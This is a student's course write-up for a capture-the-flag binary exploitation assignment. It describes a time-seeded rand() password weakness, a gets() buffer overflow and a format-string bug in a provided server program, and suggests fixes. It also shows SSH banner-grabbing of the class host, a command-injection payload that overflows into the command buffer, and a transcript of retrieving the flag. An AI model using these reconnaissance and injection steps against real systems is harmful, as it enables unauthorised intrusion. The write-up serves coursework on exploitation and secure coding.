# Writeup 8 - Binaries II

Name: Marco Roxas
Section: 0101

I pledge on my honor that I have not given or received any unauthorized assistance on this assignment or examination.

Digital acknowledgement: Marco Roxas

## Assignment Writeup

### Part 1 (100 pts)
Answer the following questions regarding the server executable (for which source is provided).

1. How is the per-session administrator password generated? Are there any inherent weaknesses in this implementation?

Each password character is randomly generated by using the rand() function to produce a printable character.

Yes, the rand() function is seeded with time(0) which causes it to generate the same sequence of numbers within each current second.

2. Describe two vulnerabilities in this program. Provide specific line numbers and classifications of the vulnerability. Explain potential ramifications as well as ways to avoid these vulnerabilities when writing code.

One vulnerability is on line 68, gets(buff) introduces a buffer-overflow vulnerability. This allows the attacker to overwrite the neighboring char commands[64] array with a command of the attacker's choosing (eg, ls; cat flag.txt). To avoid this vulnerability fgets() can be used to limit the characters read into the buffer.

Another is a format-string vulnerability printf(output) on line 46. This allows the attacker to view memory contents by placing %k (k converts to x) preceded by a similarly-ciphered memory address. To prevent these a proper format string is used for printf().

3. What is the flag?

`CMSC389R-{expl017-2-w1n}`

4. Describe the process you followed to obtain the flag: vulnerabilities exploited, your inputs to the server in a human-readable format, etc. If you create any helper code please include it.

server.c was pared down and saved in try.c to facilite viewing the generated password. But initially the password it generates while running locally doesn't match the remote server password for some reason, perhaps because of time differences.

Running nmap on the host doesn't reveal anything (looks to be protected well), but in investigating whether the time is off by a few seconds on the server, port 13 (daytime server port) was contacted on the server using nc, with no response. But trying port 22 (the ssh port) revealed what could be used to identify the server version:

~~~~
$ nc ec2-18-222-89-163.us-east-2.compute.amazonaws.com 22
SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3

Protocol mismatch.
~~~~

A web search for the above string showed Ubuntu 18.04.3. Running the ./server binary on the same Ubuntu version was tried, and that resulted in a matching password with the remote server. Thereafter, the buffer overflow on line 68 was exploited with a string used for command injection.

The payload string used is the first line shown here:

~~~~
whoami;ls -l;cat *;ps -aux;find; whoami;ls -l;cat *;ps -aux;find;
         1111111111222222222233333333334444444444555555555566666666667777777777
1234567890123456789012345678901234567890123456789012345678901234567890123456789
                                                               ^
~~~~

The idea was to fill in the buffer and have the match succeed since it's repeated in the list of valid commands.

An abbreviated session transcript is shown below with inputs manually typed in.

~~~~
$ ./try && nc ec2-18-222-89-163.us-east-2.compute.amazonaws.com 1337
ddW;<7D@RjCL-DjA
Choose an option:
1. encrypt
2. decrypt
3. authenticate
4. execute command
0. exit
> 3
Please provide admin password: 
ddW;<7D@RjCL-DjA
password successful, privilege elevated
Choose an option:
1. encrypt
2. decrypt
3. authenticate
4. execute command
0. exit
> 4
Admin, provide a command to execute: whoami;ls -l;cat *;ps -aux;find; whoami;ls -l;cat *;ps -aux;find;
Executing "whoami;ls -l;cat *;ps -aux;find;"
sh: 1: whoami: not found
total 44
drwxr-x--- 1 0 1000  4096 Oct 28 05:04 bin
drwxr-x--- 1 0 1000  4096 Oct 28 05:04 dev
-rwxr----- 1 0 1000    25 Oct 28 04:29 flag
drwxr-x--- 1 0 1000  4096 Oct 28 05:04 lib
drwxr-x--- 1 0 1000  4096 Oct 28 05:04 lib32
drwxr-x--- 1 0 1000  4096 Oct 28 05:04 lib64
-rwxr-x--- 1 0 1000 19716 Oct 28 05:11 server
cat: bin: Is a directory
cat: dev: Is a directory
CMSC389R-{expl017-2-w1n}
cat: lib: Is a directory
cat: lib32: Is a directory
cat: lib64: Is a directory
....
~~~~
